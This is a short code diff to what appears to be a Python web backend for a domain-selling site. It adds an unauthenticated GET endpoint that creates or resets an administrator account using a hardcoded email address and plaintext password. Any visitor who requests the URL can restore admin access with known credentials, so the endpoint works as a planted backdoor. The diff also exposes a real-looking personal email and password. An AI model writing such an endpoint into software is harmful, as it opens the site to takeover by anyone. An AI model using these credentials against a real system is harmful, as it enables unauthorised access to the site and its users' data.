@@ -190,6 +190,37 @@ async def logout(response: Response):
     response.delete_cookie("access_token", path="/")
     return {"ok": True}
 
+@api_router.get("/auth/create-default-admin")
+async def create_default_admin():
+    email = "yazziestech@gmail.com"
+    password = "PremiumNames@2026"
+
+    password_hash = hash_password(password)
+
+    existing = await db.users.find_one({"email": email})
+
+    if existing:
+        await db.users.update_one(
+            {"email": email},
+            {
+                "$set": {
+                    "password_hash": password_hash,
+                    "name": "Admin",
+                    "role": "admin",
+                }
+            },
+        )
+        return {"message": "Admin updated"}
+
+    await db.users.insert_one({
+        "email": email,
+        "password_hash": password_hash,
+        "name": "Admin",
+        "role": "admin",
+    })
+
+    return {"message": "Admin created"}
+
 
 # ----------------------- Domain Routes -----------------------
 @api_router.get("/domains", response_model=List[Domain])
